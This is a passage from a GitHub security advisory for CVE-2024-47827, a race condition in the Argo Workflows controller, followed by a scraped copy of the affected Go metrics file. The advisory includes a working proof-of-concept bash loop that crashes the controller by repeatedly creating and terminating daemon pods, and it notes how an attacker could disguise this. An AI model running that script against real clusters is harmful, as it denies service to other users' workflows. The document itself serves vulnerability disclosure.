  [ce7f9bf](/argoproj/argo-workflows/commit/ce7f9bfb9b45f009b3e85fabe5e6410de23c7c5f)

  |  | k8sMetrics.roundTripper = rt |
  | --- | --- |

This appears to have been added in this commit [9756bab](https://github.com/argoproj/argo-workflows/commit/9756babd0ed589d1cd24592f05725f748f74130b) / [#13265](https://github.com/argoproj/argo-workflows/pull/13265) / v3.6.0-rc1

### PoC

With the `KUBECONFIG` variable set to an appropriate file with `create` permissions for the `Workflow` kind, execute the following bash script:

```
#!/bin/bash -xeu

while true ; do
    name=$(
        { argo submit /dev/stdin <<'EOF'
apiVersion: argoproj.io/v1alpha1
kind: Workflow
metadata:
  generateName: curl-
spec:
  entrypoint: main
  templates:
  - name: main
    dag:
      tasks:
        - name: no-op
          template: no-op
          withSequence:
            count: 3
  - name: no-op
    daemon: true
    container:
      image: alpine:3.13
      command: [sleep, infinity]
EOF
    } | head -n1 | awk '{ print $2 }'
    )
    ( sleep 30; argo terminate $name ) &
    sleep 15
done
```

This script creates, and subsequently cleans up, multiple `daemon` pods in rapid succession. Each pod cleanup involves executing a `kill` instruction using the Kubernetes `exec` API, triggering the conditions for the panic. This can be seen when the tests mark the pods as complete, but the workflow itself never completes. Observing the controller logs when this happens shows the panic and restart of the controller every few seconds. In a setup with exponential backoff (e.g. a Kubernetes Pod) this is enough to reliably cause crashes enough to extend this backoff significantly and leave other workflows stalled.

Because the restarted controller believes it has sent the `kill` signal, it will wait indefinitely for the pod to terminate, which it never will, so the attack must constantly garbage-collect its own workflows with the `argo terminate` command, otherwise the maximum concurrently running workflows will be reached. A more sophisticated attack could detect when the workflow has been signaled to clean up and terminate it then instead of relying on a simple timer.

### Impact

A malicious user with access to create workflows can continually submit workflows that do nothing except create and then clean up multiple daemon pods, resulting in a crash-loop that prevents other users' workflows from running. This can be done with only a handful of pods and very little cpu and memory, meaning typical multi-tenant Kubernetes controls such as Pod count and resource quotas are not effective at preventing it.

Because the panic log does not in any way suggest that the issue has anything to do with the daemon pods, and an attacker could easily disguise these daemon pods as part of a genuine workflow, it would be difficult for administrators to discover the root cause of the DoS and the individuals responsible to remove their access.

### Severity

Moderate

5.7

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Adjacent

Attack complexity
Low

Privileges required
Low

User interaction
None

Scope
Unchanged

Confidentiality
None

Integrity
None

Availability
High

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H

### CVE ID

CVE-2024-47827

### Weaknesses

[CWE-362](/advisories?query=cwe%3A362) [CWE-1108](/advisories?query=cwe%3A1108)

### Credits

* [![@meln5674](https://avatars.githubusercontent.com/u/23241527?s=40&v=4)](/meln5674)
  [meln5674](/meln5674)
  Reporter
* [![@agilgur5](https://avatars.githubusercontent.com/u/4970083?s=40&v=4)](/agilgur5)
  [agilgur5](/agilgur5)
  Analyst

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from github.com_11438c71_20250114_182159.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fargoproj%2Fargo-workflows%2Fblob%2Fce7f9bfb9b45f009b3e85fabe5e6410de23c7c5f%2Fworkflow%2Fmetrics%2Fmetrics_k8s_request.go)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fargoproj%2Fargo-workflows%2Fblob%2Fce7f9bfb9b45f009b3e85fabe5e6410de23c7c5f%2Fworkflow%2Fmetrics%2Fmetrics_k8s_request.go)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=argoproj%2Fargo-workflows)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[argoproj](/argoproj)
/
**[argo-workflows](/argoproj/argo-workflows)**
Public

* [Notifications](/login?return_to=%2Fargoproj%2Fargo-workflows) You must be signed in to change notification settings
* [Fork
  3.2k](/login?return_to=%2Fargoproj%2Fargo-workflows)
* [Star
   15.3k](/login?return_to=%2Fargoproj%2Fargo-workflows)

* [Code](/argoproj/argo-workflows)
* [Issues
  981](/argoproj/argo-workflows/issues)
* [Pull requests
  139](/argoproj/argo-workflows/pulls)
* [Discussions](/argoproj/argo-workflows/discussions)
* [Actions](/argoproj/argo-workflows/actions)
* [Projects
  1](/argoproj/argo-workflows/projects)
* [Security](/argoproj/argo-workflows/security)
* [Insights](/argoproj/argo-workflows/pulse)

Additional navigation options

* [Code](/argoproj/argo-workflows)
* [Issues](/argoproj/argo-workflows/issues)
* [Pull requests](/argoproj/argo-workflows/pulls)
* [Discussions](/argoproj/argo-workflows/discussions)
* [Actions](/argoproj/argo-workflows/actions)
* [Projects](/argoproj/argo-workflows/projects)
* [Security](/argoproj/argo-workflows/security)
* [Insights](/argoproj/argo-workflows/pulse)

## Files

¬†ce7f9bf
## Breadcrumbs

1. [argo-workflows](/argoproj/argo-workflows/tree/ce7f9bfb9b45f009b3e85fabe5e6410de23c7c5f)
2. /[workflow](/argoproj/argo-workflows/tree/ce7f9bfb9b45f009b3e85fabe5e6410de23c7c5f/workflow)
3. /[metrics](/argoproj/argo-workflows/tree/ce7f9bfb9b45f009b3e85fabe5e6410de23c7c5f/workflow/metrics)
/
# metrics\_k8s\_request.go

Copy path Blame  Blame
## Latest commit

## History

[History](/argoproj/argo-workflows/commits/ce7f9bfb9b45f009b3e85fabe5e6410de23c7c5f/workflow/metrics/metrics_k8s_request.go)79 lines (70 loc) ¬∑ 2.06 KB¬†ce7f9bf
## Breadcrumbs

1. [argo-workflows](/argoproj/argo-workflows/tree/ce7f9bfb9b45f009b3e85fabe5e6410de23c7c5f)
2. /[workflow](/argoproj/argo-workflows/tree/ce7f9bfb9b45f009b3e85fabe5e6410de23c7c5f/workflow)
3. /[metrics](/argoproj/argo-workflows/tree/ce7f9bfb9b45f009b3e85fabe5e6410de23c7c5f/workflow/metrics)
/
# metrics\_k8s\_request.go

Top
## File metadata and controls

* Code
* Blame

79 lines (70 loc) ¬∑ 2.06 KB[Raw](https://github.com/argoproj/argo-workflows/raw/ce7f9bfb9b45f009b3e85fabe5e6410de23c7c5f/workflow/metrics/metrics_k8s_request.go)12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879package metrics
import ( "context" "net/http" "time"
 "k8s.io/client-go/rest"
 "github.com/argoproj/argo-workflows/v3/util/k8s" "github.com/argoproj/argo-workflows/v3/util/telemetry")
const ( nameK8sRequestTotal = `k8s\_request\_total` nameK8sRequestDuration = `k8s\_request\_duration`)
func addK8sRequests(\_ context.Context, m \*Metrics) error { err := m.CreateInstrument(telemetry.Int64Counter, nameK8sRequestTotal, "Number of kubernetes requests executed.", "{request}", telemetry.WithAsBuiltIn(), ) if err != nil { return err } err = m.CreateInstrument(telemetry.Float64Histogram, nameK8sRequestDuration, "Duration of kubernetes requests executed.", "s", telemetry.WithDefaultBuckets([]float64{0.1, 0.2, 0.5, 1.0, 2.0, 5.0, 10.0, 20.0, 60.0, 180.0}), telemetry.WithAsBuiltIn(), ) // Register this metrics with the global k8sMetrics.metrics = m return err}
type metricsRoundTripper struct { ctx context.Context roundTripper http.RoundTripper metrics \*Metrics}
// This is a messy global as we need to register as a roundtripper before// we can instantiate metricsvar k8sMetrics metricsRoundTripper
func (m metricsRoundTripper) RoundTrip(r \*http.Request) (\*http.Response, error) { startTime := time.Now() x, err := m.roundTripper.RoundTrip(r) duration := time.Since(startTime) if x != nil && m.metrics != nil { verb, kind := k8s.ParseRequest(r) attribs := telemetry.InstAttribs{ {Name: telemetry.AttribRequestKind, Value: kind}, {Name: telemetry.AttribRequestVerb, Value: verb}, {Name: telemetry.AttribRequestCode, Value: x.StatusCode}, } (\*m.metrics).AddInt(m.ctx, nameK8sRequestTotal, 1, attribs) (\*m.metrics).Record(m.ctx, nameK8sRequestDuration, duration.Seconds(), attribs) } return x, err}
func AddMetricsTransportWrapper(ctx context.Context, config \*rest.Config) \*rest.Config { wrap := config.WrapTransport config.WrapTransport = func(rt http.RoundTripper) http.RoundTripper { if wrap != nil { rt = wrap(rt) } k8sMetrics.ctx = ctx k8sMetrics.roundTripper = rt return &k8sMetrics } return config}

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.


